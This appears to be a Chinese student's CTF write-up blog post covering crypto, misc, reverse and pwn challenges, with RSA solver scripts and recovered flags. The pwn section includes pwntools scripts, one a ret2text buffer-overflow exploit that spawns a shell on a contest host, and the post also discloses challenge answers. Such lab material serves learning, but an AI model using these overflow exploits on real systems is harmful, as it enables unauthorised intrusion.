+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><p>拿到一个xlsx，内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116220425.png" alt="xlsx"><br>全部拿到后内容如下</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">71736E6374667B333939623130</span><br><span class="line">D226139343D293663336D24636</span><br><span class="line">6466623564303365346364307D</span><br></pre></td></tr></table></figure>
+<p>虽然这一看就是一个hex,但是需要注意的是第二排需要按照倒叙的方式来解,倒叙后内容如下</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">71736E6374667B333939623130</span><br><span class="line">63642d633366392d343931622d</span><br><span class="line">6466623564303365346364307D</span><br></pre></td></tr></table></figure>
+<p>解密后flag如下<br><code>qsnctf&#123;399b10cd-c3f9-491b-dfb5d03e4cd0&#125;</code></p>
+<h2 id="xor-未解出"><a href="#xor-未解出" class="headerlink" title="xor??-未解出"></a>xor??-未解出</h2><p>这个没解出来。。题目如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,p,q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">gift = (p &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span>)) | ((q &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span>)) &lt;&lt; <span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (p &gt;&gt; <span class="number">512</span>) | (q &gt;&gt; <span class="number">512</span>) == p &gt;&gt; <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;gift = <span class="subst">&#123;gift&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 22300263779226600333707473198598647654586791738192786487872341060549374464515756464831291121794493491628026410031636012731224310283780712705127946876337346792983330169999708383502979934455218977341916203480043646330249706425191087158768772897284824714215310750500324405913078513586115942973598972028456719258412752868858010367332454700749465077295893753856300090205499399672260914493625284837623170771182663958262375169538237641806992429167611040610962810390047099494198147686583829074495458147901228382344710045093591497591069538588549638706624689358708178742953378013980352591578590565561973692754878065312844684039</span></span><br><span class="line"><span class="string">c = 2789349312179674828983519895012288021364883565541096223573403043876145063155298742667101315206330923965626225224722216578129785473659597135634073481357017163156801089623720545920267633251219433978329233179047589516882719597561666650966835698340944488882002550160001904108294903200508334328339836462532458745875470345613890981070063190554683505521428298485976862346790095837034606211107203193453017429253887699383192730893936894968671587051400342232432929531973833505733677046502666077369824478853033623369528901115690813846094658073821756265042291548636374267713902023795637057278347955318752713402772285916021781682</span></span><br><span class="line"><span class="string">gift = 131398839321309540646267063721349417789603592370980593410155240946696431870464030053462906524477650498948454139295406557167508415001798276366289094569175144435884833537410440153695724327068254496589876483771534218696482878357965602053184992717780586024384289674850266219571906505500511285657212316507394933353</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="高等数学1"><a href="#高等数学1" class="headerlink" title="高等数学1"></a>高等数学1</h2><p>题目内容如下</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</span><br><span class="line">求解出d作为flag提交</span><br><span class="line"></span><br><span class="line">提示：phi_n = (p-1)*(q-1)，将e和phi_n进行反函数求模即可。</span><br></pre></td></tr></table></figure>
+<p>通过下面脚本即可拿到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inverse</span>(<span class="params">a, m</span>):</span><br><span class="line">    m0, x0, x1 = m, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q = m0 // a</span><br><span class="line">        m0, a = a, m0 - q * a</span><br><span class="line">        x0, x1 = x1, x0 - q * x1</span><br><span class="line">    <span class="keyword">return</span> x0 % m</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = mod_inverse(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>
+<p>flag为<code>flag&#123;125631357777427553&#125;</code></p>
+<h2 id="高等数学2"><a href="#高等数学2" class="headerlink" title="高等数学2"></a>高等数学2</h2><p>题目内容就是这些东西</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e = 65537</span><br><span class="line">c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br></pre></td></tr></table></figure>
+<p>通过下面脚本拿到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
+<p>flag为<code>flag&#123;5577446633554466577768879988&#125;</code></p>
+<h2 id="DHDH-未解出"><a href="#DHDH-未解出" class="headerlink" title="DHDH-未解出"></a>DHDH-未解出</h2><p>题目如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line">p = <span class="number">62606792596600834911820789765744078048692259104005438531455193685836606544743</span></span><br><span class="line">g = <span class="number">5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DH</span>():</span><br><span class="line">    a=randrange(p)</span><br><span class="line">    b=randrange(p)</span><br><span class="line">    A=<span class="built_in">pow</span>(g,a,p)</span><br><span class="line">    B=<span class="built_in">pow</span>(g,b,p)</span><br><span class="line">    s1=<span class="built_in">pow</span>(A,b,p)</span><br><span class="line">    s2=<span class="built_in">pow</span>(B,a,p)</span><br><span class="line">    <span class="keyword">assert</span> s1==s2</span><br><span class="line">    <span class="keyword">return</span> s1,<span class="built_in">pow</span>(A,<span class="number">2</span>*b,p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg</span>):</span><br><span class="line">    l=<span class="number">16</span>-<span class="built_in">len</span>(msg)%<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> msg+l*<span class="built_in">chr</span>(l).encode()</span><br><span class="line">s,hint=DH()</span><br><span class="line">key=sha256(<span class="built_in">str</span>(s).encode()).digest()</span><br><span class="line">aes=AES.new(key[:<span class="number">16</span>],AES.MODE_ECB)</span><br><span class="line">cipher=aes.encrypt(pad(FLAG))</span><br><span class="line"><span class="built_in">print</span>(s&gt;&gt;<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(hint&gt;&gt;<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(cipher.<span class="built_in">hex</span>())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1361502353718142335290756823026766551003746542140869010376</span></span><br><span class="line"><span class="string">1828232899563452375539387989530262337663045447357617554114</span></span><br><span class="line"><span class="string">fe9d5504337268af5038f5f538d6e27c2a5d69b50edb8fdb3d085227090fab85f34c19fb3b32f6a1c667373d4ce9d5b0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>没解出来。。。</p>
+<h2 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h2><p>这道题。。佩服出题人提供的附件，里面直接就是flag,直接看题吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;C@d0_1s_s0_3asy!&#125;&#x27;</span></span><br><span class="line"><span class="comment">#assert len(flag) == 22</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMyPrime</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mp = getPrime(<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">if</span> (mp - <span class="number">1</span>) % e ** <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> mp</span><br><span class="line">e = <span class="number">23</span></span><br><span class="line">p = getMyPrime(e)</span><br><span class="line">q = getMyPrime(e)</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, p * q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;p * q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = 23</span></span><br><span class="line"><span class="string">n = 63465293776825804886780705907118514318354492203844885746068763972603420624459</span></span><br><span class="line"><span class="string">c = 8415448673923521810157495017636043788928337310356253266903946044592128831391</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>flag为<code>flag&#123;C@d0_1s_s0_3asy!&#125;</code></p>
+<h2 id="power-未解出"><a href="#power-未解出" class="headerlink" title="power-未解出"></a>power-未解出</h2><p>题目如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]+urandom(<span class="number">128</span>-<span class="built_in">len</span>(flag)))</span><br><span class="line">m2 = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]+urandom(<span class="number">128</span>-<span class="built_in">len</span>(flag)))</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e1 = getPrime(<span class="number">16</span>)</span><br><span class="line">e2 = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,<span class="number">100</span>,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m1,<span class="number">201</span>,n) + e1</span><br><span class="line">c3 = <span class="built_in">pow</span>(m2,<span class="number">3</span>,n)</span><br><span class="line">c4 = <span class="built_in">pow</span>(m2,<span class="number">5</span>,n) + e2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c3 = <span class="subst">&#123;c3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c4 = <span class="subst">&#123;c4&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 118551384105265891143241093249027825785975552077598433349491906297304376014433545146681576312672860392895740874135183252592199074916652958722532441310299368574407429281595875200076325010809218722569831431269164222918750275453537587439380341362035526268555097575973427405577674303858695799268503307304543423063</span></span><br><span class="line"><span class="string">c1 = 87457268939573192120622126045719881506636419685131068960408775013001944668364075230248268273203778617951381294781106811900667729470329301342312615051787830757000315684365286434709267452816294982790221925573245151823415334741569605616576940338843584693128994087886808502555759223154299903971565577448316614328</span></span><br><span class="line"><span class="string">c2 = 23392680863562877012124860793229018418883106005846624676772731890613378685805549920531076176062442715192138578953654144535984477169391436311656848448046539545152124987757977144390574606249346989360826293515584270674930169101305999135460549834043565483952429374211671151759029303142617642249979924561633750189</span></span><br><span class="line"><span class="string">c3 = 116753531119914702189998091085515603804982822177797634882657879640256939859927348236382130729654062151110736357566214962573821592383741851497033566349080757310118522485134928318404912851656846501838656571530273243817671246806755397617788624067212148734009764625213083816577180905485446541197197725696652742410</span></span><br><span class="line"><span class="string">c4 = 101789432173086940827318148304924220350912310081074818752138448179662865165901494216292145407356834573752612403409055879217358167304865760311271596169839803911734092110080837804490998553946188023988886261546960169606191495262688174204421558754825485142547673746018349734656483749257460610084980119145152844839</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>根本解不出来。。。</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h2><p>打开附件，数据是这样的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116221931.png" alt="hex"><br>base64解出来之后全是一个16进制的数据，通过<code>010Editor</code>复原一下文件<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116222107.png" alt="文件头"><br>他的文件头是PNG直接用png打开发现下面内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116222138.png" alt="png内容"><br>没啥思路，直接拖随波逐流拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116222602.png" alt="随波逐流"><br>flag为<code>flag&#123;lsb_steg_so_easy&#125;</code></p>
+<h2 id="不想上早八"><a href="#不想上早八" class="headerlink" title="不想上早八"></a>不想上早八</h2><p>附件包一个txt提示,一个流量包,一个zip,提示信息如下</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">经过学生举报，有一个学弟经常说不想上早八。于是往老师的电脑里传了一个文件，不过文件被加密了【加密内容.zip】。</span><br><span class="line"></span><br><span class="line">已知该学生可能会将密码设置为老师的电脑密码，网管中心截获了该学生往老师电脑传送文件的一部分数据包，你是否能通过这个数据包获取到登陆密码，并成功拿到加密内容里的内容再分析出FLAG呢？</span><br></pre></td></tr></table></figure>
+<p>流量包就俩流，0里面直接就是密码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116222859.png" alt="流量"><br>通过<code>xyvtc2024</code>拿到压缩包内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116222959.png" alt="文件内容"><br>里面有非明文数据，可以继续通过随波逐流的这个工具来解密<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116223334.png" alt="随波逐流-1"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116223518.png" alt="随波逐流-2"><br>flag内容为<code>xyvtc&#123;9bfd8ebf-e0e0-48f7-85ab-051075e2167c&#125;</code></p>
+<h2 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h2><p>这个附件拿到之后是有密码的,他是一个伪加密,解压后是下面的内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116223808.png" alt="二维码"><br>这就是个二维码，给补齐标识位即可拿到flag，补全后的二维码如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116223932.png" alt="补位-CQR"><br>flag内容为<code>xyvtc&#123;People_who_know_CTF_are_the_most_affectionate&#125;</code></p>
+<h2 id="最后一个MISC"><a href="#最后一个MISC" class="headerlink" title="最后一个MISC"></a>最后一个MISC</h2><p>附件内容都是16进制的内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116224037.png" alt="文本内容"><br>通过<code>010Editor</code>复原内容是一个ppt,直接看ppt我是没拿到flag,改后缀zip,解压到本地搜索flag就可以直接拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116224314.png" alt="flag"><br>flag内容为<code>flag&#123;1ff93348-0abd-4e2a-9023-9effe8ad789b&#125;</code></p>
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="ez-Android"><a href="#ez-Android" class="headerlink" title="ez_Android"></a>ez_Android</h2><p>附件给了一个apk,这道题没做出来,但是我们老师解出来了,方法是直接解压<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116232333.png" alt="压缩包"><br>之后直接搜索flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116232407.png" alt="搜索"><br>打开这个文件即可拿到flag<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116232442.png" alt="flag"><br>flag为<code>flag&#123;bd8ccdea-b67d-4ec6-b489-eb3bde3342a2&#125;</code></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>EasyGo、KSGO、你看得懂汇编吗、数字计算可以通过我队友LeonChows的博客查看到</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="code-未解出"><a href="#code-未解出" class="headerlink" title="code-未解出"></a>code-未解出</h2><p>这个ida分析main函数的时候会报错，这个问题还不会解决，估计是有个函数没办法反编译，只能看汇编，这里也是没办法，就没搞</p>
+<h2 id="int-未解出"><a href="#int-未解出" class="headerlink" title="int-未解出"></a>int-未解出</h2><p>这个看了看似乎是一个字符串的题目，感觉难度比较高PWN这块目前就学了栈溢出，后面没学到还直接放弃了。。</p>
+<h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>这个和初赛的一道题目很像，脚本拿回来改一下即可，就是一个算术题，之前是和程序比速度，谁先算对100即可拿到bash，这次是100秒内算出100道题目可以拿到bash，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.0.2&quot;</span>, <span class="number">32265</span>)</span><br><span class="line"></span><br><span class="line">correct_count = <span class="number">0</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    msg = io.recvuntil(<span class="string">b&quot; = &quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;script:<span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;=&quot;</span> <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = msg.split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">            result = <span class="built_in">eval</span>(a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;script:计算结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            io.sendline(<span class="built_in">str</span>(result))</span><br><span class="line"></span><br><span class="line">            correct_count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;script:当前答对次数: <span class="subst">&#123;correct_count&#125;</span>&quot;</span>)</span><br><span class="line">            aaa = io.recvline().decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> aaa == <span class="string">&quot;恭喜挑战成功!\n&quot;</span>:</span><br><span class="line">                io.interactive()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;script:无法解析表达式: <span class="subst">&#123;msg&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;script:收到无效消息: <span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="text"><a href="#text" class="headerlink" title="text"></a>text</h2><p>这个很简单就是ret2text,ida分析道<code>-</code>函数直接就有<code>system(&quot;/bin/sh&quot;)</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116225938.png" alt="_函数"><br>直接拿到地址<code>0x401214</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116230007.png" alt="sh地址"><br>偏移甚至都不需要通过gdb去看直接看ida分析<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241116230103.png" alt="溢出位数"><br>v1就32，因为是64位程序，直接+8偏移位数就是40，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用地址</span></span><br><span class="line">run = <span class="number">0x0401214</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./text&quot;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.0.2&quot;</span>,<span class="number">30682</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&quot;a&quot;</span> * <span class="number">40</span> , run])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+              <a href="/tags/CRYPTO/" rel="tag"># CRYPTO</a>
+              <a href="/tags/MISC/" rel="tag"># MISC</a>
+              <a href="/tags/REVERSE/" rel="tag"># REVERSE</a>
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/11/12/GitLab%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98%E7%9A%84%E9%97%AE%E9%A2%98/" rel="prev" title="GitLab内存占用过高的问题">
+                  <i class="fa fa-angle-left"></i> GitLab内存占用过高的问题
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/12/06/Git%20Index%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="next" title="Git Index文件数据结构">
+                  Git Index文件数据结构 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="waline"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">BoyChai</span>
